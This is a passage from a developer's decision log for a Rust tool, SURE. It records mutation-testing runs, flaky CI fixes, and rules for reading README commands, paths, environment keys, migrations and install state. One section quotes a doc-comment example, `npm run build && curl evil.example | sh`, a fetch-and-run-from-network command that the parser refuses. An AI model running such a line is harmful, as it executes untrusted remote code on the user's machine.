  role its own sentence because `plain_name` for `Format` is *"rewrite the source
  to a style"* — a title a person reads in a consent prompt, describing a write
  while the reason beside it named a read. **This is also where the module parts
  company with `super::node` and `super::python`**, which *drop* their format
  role: `prettier --write` and `ruff format` are those ecosystems' conventional
  format commands and neither proposer invents a flag because a check would be
  convenient. Rust is the case where the flag *is* the conventional form, so
  dropping the role would leave the first word of the acceptance with no check
  under it.

- **A mutation survived the entire suite, and the right response turned out not
  to be another test.** Dropping `&& self.missing.is_empty()` from
  `RustChecks::is_empty` is caught by **zero** tests, and re-running the set after
  the test written for it landed left it surviving again. The reason is not a
  coverage gap: `CommandRole::Check` and `CommandRole::Test` name `cargo`, a root
  `Cargo.toml` is what declares `cargo`, and `of` returns early when no manifest
  was read — so `proposed` is never empty while `missing` is not, and **the two
  versions of that method are extensionally equal for every value the type can
  produce.** For Python the conjunction *is* load-bearing, because all four of its
  roles can be unplanned. **What the run actually found was the doc comment**,
  which claimed the second half was *"the one a mutation can drop"* and named a
  project that asked for neither tool as the proof — a shape where both versions
  answer `false`. The comment was the defect and it is rewritten to say why the
  halves agree and that the second half is unreachable here.
  `the_layer_is_empty_exactly_when_sure_read_no_manifest` holds the equivalence,
  which is the property that *can* fail the day a role table change parts them.

- **A test added in response to a survivor's finding has to be shown to have
  teeth, or it is a sentence in a different medium.** The thirteenth mutation of
  the set was added after the first run for exactly this: it takes
  `CommandRole::Check` out of `command_for`, which is the change that would make
  the two halves of `is_empty` disagree, and the new test is among the nineteen
  that catch it. **Without that row, "the comment now says why they agree" would
  be a claim with prose and no test** — the same defect the P4-T002 section above
  records four times over.

- **A red run whose failing test belongs to an accepted task is still this task's
  to read.** `P4-T004`'s implementation run `34982674189` came back macOS-red on
  `a_service_that_is_dropped_is_stopped_anyway`, a `P3-T009` test that had been
  green in every run since. The failing assertion was the test's own guard saying
  it had measured the wrong thing, and it was right: the test dropped the service
  the moment `started` appeared, and the child writes `started` one statement
  before its first heartbeat, so a loaded macOS scheduler could kill the child in
  between. `wait_until_quiet` read a file that had never been created, treated two
  equal empty readings as "quiet", and the guard refused the reading. **The fix
  establishes the premise instead of asserting it** — wait for the heartbeat, then
  drop — and closes the window one statement later by having the child write each
  heartbeat aside and rename it into place, because `fs::write` truncates before
  it writes and the only reader reads the file *after* killing the writer. **The
  colour of a run is not the finding; the sentence the failing assertion printed
  is**, and it printed that the instrument had never been written.

## P4-T005 — "not blindly run" is a claim about the source, a URL and a drive letter a code span turned into project paths, and two mutations that measured nothing until their anchors were re-read

Acceptance: *"Safe claims/paths/scripts can be validated."* / *"Arbitrary README
shell text is not blindly run."*

- **The second sentence is a claim about what the code *contains*, so the thing
  that checks it is made of the source rather than of a run.** `spawn_sites.rs` is
  already where this crate checks absences, and its first rule —
  `every_place_sure_builds_a_command_is_named_here` — asserts that the set of
  shipped files whose *code* builds a `Command` equals a list of three. `setup.rs`
  is on none of the three ways SURE can run something: it builds no `Command`; it
  does not name `ProcessRequest`, which rule two forbids everywhere but the runner
  and `service.rs`; and it does not name `Supervisor`, which rule three confines to
  `service.rs`. **A test that ran the pass and watched nothing happen could not
  tell "nothing was run" from "the fixture never parsed"**, and every absence has
  that shape — which is why the module's own test asserts three things at once.
  `the_documented_command_left_no_trace_and_was_still_read` writes a document whose
  shell text would create a file in each platform's dialect
  (`touch canary-from-bash`, `New-Item canary-from-powershell`), runs the pass, and
  asserts that the tree is byte-for-byte what it was, that neither canary name
  exists, **and** that all three of SURE's own sentences are free of `touch`,
  `New-Item`, `canary` and `npm run`. The third assertion is what makes the first
  two mean anything: a `setup.rs` that silently produced no claims would satisfy
  them both.

- **The two lists the pass produces — commands and paths — come out of one reader,
  and keeping them from overlapping is arranged rather than hoped for.**
  `documents.rs` did not read paths at all before this task; the whole second half
  is new here, `DocumentedPath` and `PathForm` and the two markup readers, because
  the byte budget, the unread accounting and the walk are the same and two passes
  over one file are how two readings of one document come to disagree. **A command
  and a path are both markup, and that is what makes them one decision**: the fence
  is the author saying *this is something you run*, and the backtick or the link is
  the author saying *this is something in the project*. A path written in prose is
  not read at all, because there is no markup saying which noun in the sentence is
  a path and SURE does not pick. **Paths are read from the lines outside every
  fence**, so the two lists cannot both claim a line — a fence's own text is a
  command, and `cp .env.example .env` names two paths and is one thing to run.

- **The cost of reading a code span is paid openly, and it is one character.** A
  span is a path candidate only when it contains a `/`, because `` `Cargo.toml` ``
  and `` `process.env.NAME` `` have the same shape — no whitespace, a dot, letters
  — and reading the second as a file would produce a page of claims about files
  that do not exist. **That is the false finding this product treats as worse than
  a visible error**, so the rule gives up every one-word span in every document and
  the module doc states the coverage it costs rather than paying for it by
  guessing. A link target is read whole, because `[setup](setup.md)` is a pointer
  with no separator in it and is unambiguously a pointer. A title after a target is
  not part of it, a `#fragment` is dropped because the file is what a scan can have
  an entry for, and `is_plain_target` refuses the characters that mean a target is
  a *pattern* or a *template* rather than a name: `*?` are globs, `{}` and `<…>`
  are placeholders, `$` is a variable, `;&|` and a backtick are shell, `%` is an
  escape, and a space separates two names. **A backslash is deliberately not
  refused** — `docs\setup.md` is how a Windows author writes a path, and
  `display_target` is where the two separators become one.

- **A documented line becomes a claim only when it can be read as *a package
  manager running a named script*, and everything else produces no claim at all
  rather than a claim of unknown status.** `script_from` splits the line with
  `split_whitespace` and then *compares*: the first word against
  `PackageManager::from_name`, the second against the two spellings the tooling
  actually defines. `npm run-script build` is npm's long form of `npm run build`,
  and `test`/`start`/`stop`/`restart` are the four shorthands **npm** has, so the
  shorthand arm carries `manager == PackageManager::Npm` inside its match guard and
  the mutation that lifts it out is caught. The refusal is the interesting half: a
  line containing any of `& | ; < > $ \` * ? ( ) { } " ' \ # %` names no script,
  because a line with a pipe or a wildcard in it is a *shell program* and reading
  its second word as a script name would be the inference `CLAUDE.md` forbids
  outright. `%` was added during this task for the reason `documents.rs` refuses a
  `%` in a path — it is the Windows spelling of a variable, so `npm run %BUILD%` is
  a template a `cmd.exe` would expand and not the name of anything.

- **`Contradicted` is the verdict that costs something, so it has a rule, and the
  rule is completeness carried as a value rather than recomputed.** A path claim
  with no reading found is contradicted *only* if nothing the walk skipped covers a
  place the path was looked for and the walk finished: `unsettled` asks the scan
  for such a skip and returns the sentence `Skipped::plain_description()` already
  wrote — *"… So it cannot say whether `docs/gone.md` is there."* — with the walk's
  own incompleteness as the second half of the same function. A script claim has
  the coarser version: with no governing manifest at all, `Contradicted` is the
  answer, but only when `scan.is_complete()`, and the comment on that branch says
  outright that the rule is **deliberately coarse** — a walk that stopped early
  gives `CannotConfirm` for every script claim in the project rather than for the
  ones under the skipped directory, because sorting those out is a second reading
  of the same evidence and this pass does not need it in order to be honest.
  **`SetupReport::is_complete` delegates to `DocumentReport::is_complete`** instead
  of restating the condition, which is what the mutation replacing its body with
  `true` is there to hold.

- **Which manifest a documented command is about is the nearest one at or above the
  document, and a manifest SURE could not read is a third state rather than an
  empty one.** `Manifests` pairs every `package.json` the walk found with the
  `Package` the discovery read for it, or with `None`; `None` produces
  `CannotConfirm` and never *"declares no scripts"*, because those are two
  different claims about the same file and only one of them is true. The winner is
  chosen by component depth, so a member's manifest beats the root's for a document
  inside the member, and the test that pins it is named for the wrong answer it
  excludes (`the_nearest_manifest_wins_and_not_the_one_that_sorts_first`). A name
  that is in `scripts_not_commands` — an entry a package manager will not run — is
  contradicted **as that**, in its own sentence, rather than as an absent script.

- **A URL inside a code span was being read as a path in the project, and the
  mutation set found it rather than a review.** ``Deploy to
  `https://example.com/app`.`` contains a `/`, which was the whole of what a span
  needed, and `https:` is not a Windows path `Prefix` — so `leaves_the_project`
  said the reading was inside the project and a correct README came back
  **contradicted**. That is a false finding, and it is the failure this product
  exists to avoid. The fix belongs where the ambiguity is: `span_candidate` refuses
  `is_absolute_reference` beside `is_plain_target`, sharing the predicate with the
  link-target reader that already refused one — **the rule that produces the second
  refusal is the first one**, since a span is a path *because it has a separator*
  and a URL has two. Held by a unit test in `documents.rs` and by
  `a_url_a_document_names_is_not_a_path_in_the_project`. The mutation that removes
  the line was caught by those two and by nothing else on the first pass, and by
  **four** tests on the re-run — a drive letter in a code span goes through the
  same refusal, so the two tests added below hold this line as well.

- **A drive letter was being read by the platform rather than by the document, and
  the CI matrix found it where this machine never could.** `C:/Windows/win.ini` is
  a `Component::Prefix` to `Path` on Windows and one ordinary relative component to
  `Path` on Linux and macOS, so one README — a Windows instruction about where a
  font or a toolchain lives — became a path *inside the project* on two platforms
  out of three, was looked for, was not found, and came back **`Contradicted`**.
  **Same false finding as the URL above, reached from the other direction**: there
  the reader was too permissive about one string, here it was platform-correct about
  a string whose meaning was never the platform's to decide. Run `34991517761`
  failed `a_path_that_climbs_out_of_the_project_is_not_looked_for` on macOS and
  Ubuntu and passed on Windows, which is the shape of a defect that cannot be found
  on the machine it is written on. The fix is at the layer that owns the ambiguity:
  `is_absolute_reference` asks a new `names_a_drive`, which reads one ASCII letter
  and a colon **from the characters** and refuses the target before a `Path` exists
  to disagree about it. **The cost is stated in the code** — a project that really
  holds a file named `C:notes.md` loses that claim too. `leaves_the_project` still
  asks the platform, because it takes a `Path` and both of the platform's answers
  are correct about the value it was handed; **its test now writes both answers down
  under `#[cfg]` instead of asserting the local one.** What the product must not do
  — let that difference reach a verdict about a document — is held from both ends,
  by a unit test that asserts the same thing wherever it runs and by
  `a_windows_location_is_not_a_path_in_the_project`, and each carries a control
  showing the same shapes *without* a drive letter are still read, so neither can
  pass because the reader went silent.

- **Two of the twenty mutation rows measured nothing on the first pass, and the
  harness said so instead of counting them.** `m4` and `m11` were both refused with
  *"the old text occurs 0 times in …\setup.rs, not once"* — `rustfmt` had joined
  the `REFUSED` array onto one line and wrapped the `anchor(format!(…))` call after
  the anchors had been written, so both `.old` files described a tree that no
  longer existed. **A row whose anchor does not match is not a survivor and it is
  not a pass; it is a row that has said nothing**, and the first run is recorded as
  18 rows measured with those two named as unmeasured rather than as 20 rows with
  18 caught. Both anchors were rewritten against the formatted source and both rows
  re-run: `m4` is caught by
  `setup::tests::a_line_that_is_more_than_one_command_names_no_script` and `m11` by
  `nothing_a_document_says_can_block_a_hand_off`, each by exactly one test. **The
  guard is why this was visible at all** — a harness that read a missing anchor as
  "no test caught it" would have filed two survivors, and one that read it as
  "nothing to do" would have filed two passes, and those two mistakes are in
  opposite directions from the same silence. **The set was then re-run in full
  against the tree this task commits: 21 rows, 21 caught, 0 survivors, 0 refused,
  every restore verified by blob hash**, the two additions being `m20`, the URL in
  a code span, and `m21`, *a drive letter is judged by the platform*, which exists
  only because the defect did.

- **One name in that run's catch lists is not a catch, and it is recorded as an
  unattributed failure rather than counted.** `m14`'s list holds four names where
  the previous run held three, and the fourth is
  `a_service_that_is_dropped_is_stopped_anyway` — `P3-T009`'s test, in a binary
  whose source contains **no occurrence of `setup` at all**, so the mutation cannot
  reach it and the failure cannot be its doing. **The row's attributable catches are
  three, and they are the same three as before.** The failure was not reproducible:
  **30 serial runs and 60 runs of six concurrent instances of that binary all pass**
  on this machine, and the fixture is process-id-unique (`sure-service-{name}-{pid}`)
  so the concurrency was real load rather than a collision. What fired is
  `P3-T009`'s test, once, under the load of a suite that starts and stops process
  trees twenty-one times. **Which assertion fired is not known and is not guessed
  at**: `mutate3.py` prints failing test *names* and the test-result lines, and the
  panic text went out of scope with the run, so the one thing that would say what
  happened is the one thing the instrument did not keep — which is a limit of this
  harness worth knowing, since it was written to report names and had to be read as
  if it reported reasons. It is recorded as an open observation about `P3-T009`
  rather than as a defect this task found or fixed, because **"not reproduced" is
  not "not there"**, and a count that quietly absorbed it would be the false green
  this whole section is about.

- **A line-ending question was asked of `grep`, `grep` answered wrong, and the
  answer had to come from the bytes instead.** `grep -c $'\r'` reported a carriage
  return on **every line** of `setup.rs`, `documents.rs` and both progress files —
  all of which are pure LF — so a reader who believed it would have "fixed" four
  files that were never broken. `git ls-files --eol` (`i/lf w/lf`) and a byte count
  in Python both say LF and agree with each other, and that agreement is what
  settles it. **The one real finding inside the false one was real**:
  `progress/HANDOFF.md` was `w/crlf` against an LF blob, so the working copy is now
  LF and the `git diff` warning it produced is gone. A line-ending claim is a claim
  about bytes, so the instrument has to be one that reads bytes.

- **A doc comment asserted behaviour the code does not have, and reading it against
  the committed function is the only thing that caught it.** The module
  documentation said `npm run build && curl evil.example | sh` "yields the name
  `build`". `script_from` compares every word against `is_plain_word`, and `&` and
  `|` are both in its refusal set, so the line names **nothing at all**. **The code
  was right and the sentence was wrong** — the refusal is the safer reading, which
  is why no test failed and no mutation row could have found it — and a comment is
  exactly how a guarantee comes to be believed without being one. Rewritten to say
  what happens, and to name the case that *does* yield a name:
  `npm run build --silent` names `build`, and the flag is never read.

- **Nothing a document says may block a hand-off, and severity is where that is
  decided.** Every `Contradicted` this module produces carries
  `Severity::ShouldFixFirst` — never `MustFix`, which `FROZEN_SEMANTICS.md` defines
  as blocking a hand-off alone. The reason is not tone: *"the README says
  `npm run build` and the manifest declares no `build`"* is a disagreement between
  two artefacts where **the wrong half is not knowable from here**, and a `MustFix`
  has to stand on an `ObservedFact` by itself.
  `nothing_a_document_says_can_block_a_hand_off` asserts it over every claim in a
  fixture that contradicts in both of the ways this module can contradict, and
  `m11`, which switches one branch to `MustFix`, is caught by that test and by
  nothing else.

- **Project text reaches a reader through two doors and no others.**
  `SetupClaim::quoted()` returns a document's full text as a value and is the only
  method that does; every name appearing *inside a sentence SURE writes* goes
  through `in_a_sentence`, which is `redact::escape_control_characters`. A script
  name holding a newline can therefore add a line to a report only by way of the
  field a caller explicitly asked for, never by way of a reason string.
  **`Assessed::evidence()` returns an empty vector for a claim it could not
  settle**, deliberately: the anchor would name the manifest SURE never read, and
  an anchor pointing at a file nobody opened reads to the next consumer as though
  somebody had.

## P4-T006 — two guards that are one decision, and the mutation that could not be caught until its row was re-anchored

**The acceptance is one sentence — *"Missing key/documentation mismatches are
reported without requiring secret values"* — and both halves of it are structural
rather than argued.** The first half is *reported*: a key only one side of the
project knows about becomes a claim with a verdict, a severity, a reason naming
the file and the line it was read at, and an anchor per place it was found. The
second half is *without requiring secret values*, and the answer is not a
redaction step but the absence of anything to redact: **no anchor this module
builds sets an excerpt** — the source contains no call to `with_excerpt` at all —
and the reason it can be zero is the reason it has to be. `EvidenceAnchor` offers
one field that exists to hold the text a claim was read from, and **the line a key
is read on is exactly the line a value is on**: `process.env.API_KEY = "…"` is one
line. An excerpt here would be a credential, so the field is never filled, and
`every_anchor_is_empty_of_excerpts` holds that against every claim a fixture can
produce rather than against the arms somebody remembered.

**One module reads and another settles, and the split is `P4-T005`'s arriving
unchanged.** `crate::references` already answers the two-list question and already
declines to draw a conclusion from it — its module documentation says the lists
*"are not a claim about the project unless the reading was complete"* — so this
task adds no reader. `crates/sure-core/src/env_completeness.rs` takes a
`ReferenceReport` and returns claims. The reason it is a second file and not a
second function: an anchor is only worth having if the hand that writes it is the
hand that knows what was read, so the layer that issues verdicts is the layer that
holds the `FingerprintId` — and a caller who wanted the key lists for a display
that settles nothing still gets lists.

- **A one-sided key is a claim only if the reading finished, and the gate is read
  once for the whole report rather than once per key.** `assess` takes `complete`
  and `unread` as parameters instead of looking them up, because both are facts
  about the reading rather than about the key. When the reading finished the claim
  is `Confirmed` *as worded* — that a source file asks for the key **and** that no
  example file or document names it, both halves things SURE read. When it did not,
  the claim is `CannotConfirm` **with an empty evidence vector**, and its reason
  names what went unread: a file and its path, or — when there is no unread file
  and the report is still incomplete — the walk, which is the only other thing
  `is_complete` weighs. The two cases are told apart from `unread.is_empty()`
  rather than guessed at, and `an_unfinished_walk_is_told_apart_from_an_unread_file`
  is one test for the pair.

- **Nothing here is ever `Contradicted`, and that is a property of the subject
  rather than a gap in the pass.** A contradicted claim is one the *project* made
  and SURE refuted — a README naming a file that is not there, which `crate::setup`
  reaches because a document does claim its paths exist. An undeclared key refutes
  nothing: no file in the project says the key is documented, so there is no
  statement for the finding to be the opposite of.
  `a_claim_never_reaches_contradicted` asserts that over every claim in a fixture
  that produces both one-sided statuses.

- **Severity follows the side that is missing, and the highest it goes is
  `ShouldFixFirst`.** A key read but named nowhere is `ShouldFixFirst`; a key named
  but read nowhere is `CanFixLater`, because *"no source file SURE read asks for
  it"* is a statement about SURE's reading and a key can be read by a shell script,
  a container file, a build configuration or a language SURE does not read — the
  reason sentence says exactly that rather than concluding the key is unused.
  **Neither reaches `MustFix`**, which `FROZEN_SEMANTICS.md` defines as blocking a
  hand-off alone: neither finding is severe enough to stop a person, and
  `the_severity_follows_the_side_that_is_missing` asserts over every claim in the
  fixture that none of them blocks a hand-off — which is why `m11`, which switches
  the undeclared branch to `MustFix`, is caught by that test and by the integration
  test that reads severities off a whole project.

- **`PROVIDED_BY_RUNTIME` is a public, exact, case-insensitive list of 53 names,
  and a key on it still gets a claim.** `PATH`, `HOME`, `NODE_ENV`, the Windows
  known-folder variables, `CARGO_HOME`, `VIRTUAL_ENV`, the `GITHUB_*` set a CI
  machine sets — a process is given these before any project code runs, and no
  project should document them. The list is deliberately **exact rather than a
  prefix rule**: a reader asking why `GITHUB_SHA` is set aside and `GITHUB_TOKEN`
  is not has no way to find that out from a name, and `PATH_TO_DATA` and
  `NODE_ENVIRONMENT` are a project's own keys that a substring rule would swallow
  — `m8` makes exactly that change and is caught by one test. Matching is
  case-insensitive because Windows gives one environment to every process
  regardless of the case a program asks in, so `Path` and `PATH` cannot be told
  apart there; where the two rules could disagree the answer is *set aside*,
  because the cost of setting aside a key a project did define is one finding not
  made, and the cost of the other answer is every Windows run reporting `Path`.
  **A runtime key is not dropped from the report** — it becomes a claim carrying
  `Severity::Note`, reachable through `set_aside()`, so a reader sees the key and
  SURE's judgement about it; `provided` is a count in `plain_description` rather
  than a filter over the list.

- **An evidence list has a bound, and the sentence says when it was reached.**
  `MAX_ANCHORS` is 8. A key read on every line of a generated file would otherwise
  produce an evidence list that grows with the project, so the anchors are cut and
  `with_anchor_count` appends *"SURE found N places on this side of the comparison
  and anchors the first 8"* — but **only when the list was actually cut**, which is
  why `m7`, which removes that condition, is caught by three tests including the
  integration one that reads a key 30 times.

- **`plain_description` leads with both side counts, so a claim-free report cannot
  read the same for two different facts.** The disagreement fixture's sentence is
  *"SURE read 3 environment or configuration keys asked for in this project's
  source files and 2 named in its examples or documents: 1 key asked for and named
  nowhere, 1 key named and asked for nowhere, 1 key provided by the machine rather
  than by the project."* — all five counts asserted individually rather than the
  sentence as a whole, so a failure names which count moved. The project that
  names nothing produces *"0 environment or configuration keys"* rather than the
  same sentence with the other numbers zeroed, which is the difference between
  *every key matches* and *there were no keys* — a reading the user would
  otherwise have to infer from an absence.

- **The module is deliberately not registered in `crate::checks`.** `P4-T005` set
  that precedent for the same reason: `schedule.rs`'s `CheckProposal` and
  `PlanBuilder` are how a pass becomes part of a plan, and registering one here
  would be a decision about the plan rather than about this check. Nothing depends
  on it either way, and the acceptance sentence is about what is reported rather
  than about when.

**The one thing the first mutation pass found, and it was not a missing test.**
`m5` removed the early return in `assess` — the match that answers for a key both
sides agree about — and **survived**: 41 result lines, 1202 passed, 0 failed.
The cause is structural rather than a coverage gap. `assess` gives that answer in
two places, because `KeyStatus` has three variants and the tail `match` must name
all three whether or not the early return runs first: **either guard alone is
sufficient**, so a mutation that removes one of a redundant pair is an equivalent
mutant and cannot be caught by any test. Two things followed, and both are
corrections to this task's own work rather than to its behaviour. The comment above
the early return claimed *"there is one place where a key becomes a claim or does
not"*, which the tail arm makes false; it now says what is true — the two are one
decision written twice, and the alternative would be building a claim here and
dropping it there — and it names the measurement rather than asserting a
conclusion. And `m5` was re-anchored at the **answer** instead of at one of the
guards: an agreed key sent into the declared side, which is a claim SURE must not
make, is a single-site mutation the tests can see. **A row that survives because
the code says the same thing twice is a row that measured nothing, and the honest
repair is to ask it a question that has an answer.**

**The set was then re-run in full against the tree this task commits: 20 rows over
one file, 20 caught, 0 survivors, 0 inconclusive, every restore verified by blob
hash.** The re-anchored `m5` is caught by five tests — `an_agreed_key_makes_no_claim`
in the module and four in `tests/env_completeness.rs` — which is what the row was
always meant to be asking. **One file, because this task adds one source file**:
the other new file is a test, and a mutation that lands in a test asserts something
about the harness rather than about the code, which is why `P4-T005`'s set spanned
the two *reading* modules it added to and not its own test file. The empty filter is
the other half of the same point — `cargo test --no-fail-fast -p sure-core` with no
target selector, so a survivor would be a mutation the whole crate's suite missed
rather than one a narrow filter never looked at.


## P4-T007 — the record that is there and empty, and the mutation that could not be caught until its anchor spanned both evidence values

**The acceptance has two sentences — *"Framework-specific detectors are
pluggable."* and *"Mandatory missing-migration fixture can be detected."* — and
the first is the one that shaped the module rather than the one that describes
it.** A `Detector` is a row of four constants: the file that says a framework is
in use, the path it keeps its record at, the predicate that decides what counts as
a migration, and the framework's name. Adding a framework is writing a row —
`look`, `count_under` and `assess` name no framework anywhere —
`a_detector_sure_does_not_ship_is_used_without_touching_any_shipped_code` holds
that by detecting one from the test's own table, and
`a_framework_sure_does_not_ship_is_detected_over_real_files` holds it again
against a real walk of a real directory. `Detector` deliberately does **not**
derive `PartialEq`: one field is a function pointer, and
`unpredictable_function_pointer_comparisons` is a warning under this workspace's
`-D warnings`, so a caller that wants to know whether two rows are the same
framework compares `framework`.

- **One sentence decides every verdict in the module: a gap is a claim only where
  the shape is and the record is not.** A framework is in play when the file that
  says so is in the walk; its record is the directory, or the files, under the path
  the convention names. `Record::Holds(n)` for `n > 0` produces **no claim at all**
  — `Looked::gap()` returns `None` and the report is silent about that framework,
  because a project with migrations is not a finding. `Record::Empty` and
  `Record::Absent` do produce one, and they are never the same claim. That
  asymmetry is what makes the module a check rather than a directory listing: the
  interesting answer is absence, and everything else exists to establish that
  absence is real.

- **Two severities, and the distance between them is the whole argument.** An empty
  record is `MustFix`; an absent one is `ShouldFixFirst`. The reason is in the
  module's own sentence rather than in a comment: **a project that has never
  written its first migration and a project whose record was lost or never made
  look the same from here**, and `prisma init` writes exactly the first of those —
  a schema and no `prisma/migrations`. `FROZEN_SEMANTICS.md` defines `MustFix` as
  blocking a hand-off *alone*, and a finding whose own sentence hedges cannot do
  that. `m5` and `m6` move one severity each; they are the pair this task's
  argument turns on, and a set holding only one of them would leave the claim
  untested in the other direction.

- **The one thing a later task has to know: `evaluation/acceptance-manifest.json`
  expects `must_fix` for `missing-migration`, and this check reaches it through the
  *present-and-empty* shape.** The fixture app and the check therefore have to
  agree on which shape `must_fix` names, and this is where that agreement is
  recorded rather than left to be discovered. `fixtures/adversarial/
  missing-migration/` and the conformance test that pins the fixture-expectation
  type are **`P14`'s** — `P14-T001`–`P14-T011` own the fixture apps — so this task
  demonstrates detection with fixtures of its own and does not reach into them.
  Both shapes are held here by integration tests,
  `the_missing_migration_scenario_is_reported_as_a_must_fix` and
  `a_schema_with_no_record_directory_at_all_is_reported_without_stopping_a_hand_off`,
  so whichever way `P14` resolves the correspondence, the behaviour it is
  resolving *about* is pinned. **The cost of changing the choice:** moving
  `Absent` to `MustFix` would make every freshly-initialised project block a
  hand-off, which is why it is not there, and moving `Empty` down would make the
  acceptance fixture unreachable.

- **The detectors are paths, and the table has no column for a declared
  dependency.** Prisma, Drizzle and Diesel are not in the discovery tool tables at
  all, so such a column would never fire for them. Alembic **is** — `python.rs`'s
  `TOOLS` table names it as an ORM — and reading the file is still the rule for it,
  because a table that named some frameworks and not others would be one rule for
  the projects SURE already knows and another rule for the rest. It is also the
  stronger rule for the case this product exists for: a project an AI assembled
  from a snippet has the config file and never added the package to its manifest,
  so a manifest-driven detector would answer *no framework here* about exactly the
  project most likely to have the problem.

- **The module reads nothing, and one of the tests says so about the source rather
  than about the behaviour.** Every rule takes `&[Entry]` — the walk's own list —
  rather than a `Scan`, and that is affordable only because a scan already holds
  every path under a directory it entered. `the_module_opens_no_file` reads
  `db_migrations.rs`, cuts at `#[cfg(test)]`, and fails if `std::fs`, `fs::read`,
  `read_to_string`, `File::open`, `OpenOptions` or `BufReader` appears on any line
  that is not prose. **It is written that way because "this stage does not open
  files" is a claim about the source, and a behavioural test can only sample it.**
  The `&[Entry]` signature is what makes the claim affordable — and it is also what
  makes the unit tests possible at all, because `Scan`'s fields are private and
  there is no `Scan::for_test`: the first draft of this module took `&Scan` and
  could not have been tested below the integration level.

- **The case a path is looked up by is `CaseSensitivity::platform()`, not the case
  the caller chose for the walk.** `lookup_key` moves from `pub(super)` to
  `pub(crate)` for this, with the note in `discover/read.rs` updated to say who
  else uses it, so the folding rule stays written once. The reason the platform's
  answer is the right one rather than the caller's: the question the comparison
  answers is whether two names are the same **file**, which is a fact about the
  filesystem and not about the ignore-table rule a caller handed `ScanOptions`.
  **And the gate on the test is `#[cfg(not(any(windows, target_os = "macos")))]`,
  not `#[cfg(not(windows))]`** — `CaseSensitivity::platform()` folds macOS with
  Windows, so a `not(windows)` gate would have run the case-*sensitive* assertion
  on a platform that answers case-*insensitively* and failed the macOS job. That
  trap is why the pair is written as one test per platform class with the
  assertion each one can actually hold.

**The mutation set is 21 rows over the one source file this task adds, 21 caught,
0 survivors, 0 inconclusive, every restore verified by blob hash — and every row
ran the same 1236-test suite.** The filter is empty for every row, so a survivor
would be a mutation the whole crate's suite missed rather than one a narrow filter
never looked at, and the internal check is exact rather than approximate: **42
result lines in every row, and `passed + caught = 1236` in every row**, so the only
number that moved across the 21 runs is the catch count. The set's decision list is
in the script's own header; the rows worth naming here are the two that needed a
different anchor and the two that carry the argument.

- **`m3` could not be written the obvious way, and the reason is worth recording
  because it is a property of the harness rather than of the code.** The mutation
  "a claim SURE could not settle is anchored anyway" wants `evidence:
  evidence_of(&claim, …)` where `evidence: Vec::new()` is, but the struct literal
  moves `claim` into its own field before that field is evaluated, so the borrow is
  a use-after-move and the row **would not have compiled** — and a row that does
  not compile is reported `INCONCLUSIVE`, which says nothing either way rather than
  saying "caught". The row re-derives the gap from `looked` instead, which is what
  puts a value in the reader's hand and compiles.

- **`m16` had to span both evidence values, and that is `P4-T006`'s equivalent-pair
  finding in a different costume.** Flipping one of the two `ObservedFact` classes
  to `ModelAssessment` is an **equivalent mutant**: `Finding::is_grounded` asks
  whether *any* evidence can alone support a `must_fix`, so a claim carrying one
  observed fact and one model assessment is still grounded and no test in the suite
  can see the difference. The repair is the same one `P4-T006` recorded — re-anchor
  at the answer rather than contort the code — and here the answer is *neither of
  these is a model assessment*, so the row moves both. **A one-line anchor was
  available and would have produced a survivor that measured nothing.**

- **`m5` and `m6` are the pair the task's argument turns on, and `m8` is the one
  that shows a check can be undone by one character.** `m5` sends an empty record
  to `ShouldFixFirst` and is caught by 9 tests; `m6` sends an absent one to
  `MustFix` and is caught by 3. `m8` drops the trailing `/` from the prefix a
  count is taken under — `prisma/migrations-old/2020_x` starts with
  `prisma/migrations` as a string and is not inside it as a path — and is caught by
  11, which is the largest catch list in the set.

**What this task does not do, stated where the module states it.** It does not run
a migration, a schema tool or a database; it does not read a manifest to find out
whether the framework's package is a declared dependency; and it does not decide
whether a project's migrations are *correct* — only whether a project that has a
schema has a record of how the database reached it. `P4-T007` is the first use of
`AnchorSubject::Database` in the crate, which until now was a variant with no
caller.

## P4-T008 — the packages a project declares and did not install, and the reading that stops a failure being about the code

**The acceptance has two sentences and they pull in opposite directions, which is
what shaped the module rather than what describes it.** *"Missing dependencies are
distinguishable from failing project code."* asks SURE to say something about
installed state. *"Install remains separate approved action."* forbids SURE from
doing anything about it. Three places in the repository forbid looking at installed
state at all — `docs/architecture/ECOSYSTEM_DISCOVERY.md:641-645` argues that
installed-ness must not influence what a project **is**, `checks/mod.rs` says the
same, and `checks/rust.rs` declines to carry an install step — so the first
sentence could only be answered by giving the reading a **different subject**.

- **Not *what is this project* but *what can SURE do with it right now*.** That is
  the whole resolution. The question this module answers is a property of the
  **run**: it changes between two runs over one unchanged commit, and it differs
  between two people on one branch. That is exactly why it does not belong in a
  discovery result — where it would make a stale `node_modules` change the
  project's identity and a fresh clone a project SURE cannot classify — and exactly
  why it belongs beside the check results it is used to read. Nothing is added to
  `Discovery`; the module reads one and produces claims of its own.

- **One sentence decides every verdict: a sentinel SURE met means nothing, and a
  sentinel it did not meet over a walk that finished means one thing.** `met()`
  asks the walk's **two** lists — `skipped()` and `entries()` — because
  `node_modules` arrives as a `Skipped` and `.pnp.cjs` arrives as an ordinary
  `Entry`, and a rule that consulted only one of them would be silent about one
  kind of project. `InstallState::of` is three-valued rather than two: `InPlace`,
  `NotInPlace`, and `CannotTell` for a walk that did not finish, and only
  `NotInPlace` reads as `Reading::TheDependencies`. `m7` makes the two lists agree
  instead of either one counting and is caught by 5 tests; `m5` removes the
  completeness gate and `m6` removes the early return that keeps a met sentinel
  from producing a claim.

- **The module never says the packages are installed, not even when it finds the
  directory an install fills.** What is installed is the package manager's answer:
  the directory can be stale, partial, or for a different lockfile than the one in
  the tree, and SURE reading a name cannot tell any of that apart from the good
  case. **Every way of being wrong in the presence direction is silent** — a false
  sentinel suppresses a finding, and only a true absence can produce one — so the
  direction of the error is chosen rather than hoped for. `a_sentinel_being_present
  _is_not_a_statement_that_the_packages_are_right` holds that with a stale tree.

- **The severity is argued from the frozen text rather than chosen: the claim is
  `Severity::Note`.** `MustFix` is *"Do not recommend publishing or handing this
  off."*, and a fresh clone of a healthy project is in exactly this state — so
  `MustFix` would make SURE refuse to pass judgement on a project it has not been
  able to check yet. `ShouldFixFirst` is *"A material reliability or quality
  risk."*, which is the wrong **subject** as well as the wrong weight: the risk is
  to SURE's ability to *measure* the project's quality, not to the project's
  quality, and calling an environment fact a quality risk of the code is the exact
  confusion this task exists to prevent. Two properties follow and neither is
  bolted on: a `Note` cannot `blocks_hand_off`, and `can_alone_support_must_fix` is
  about an evidence **class** rather than a level, so no missing package can become
  a `must_fix` about somebody's code. `m17` and `m18` move the severity each way,
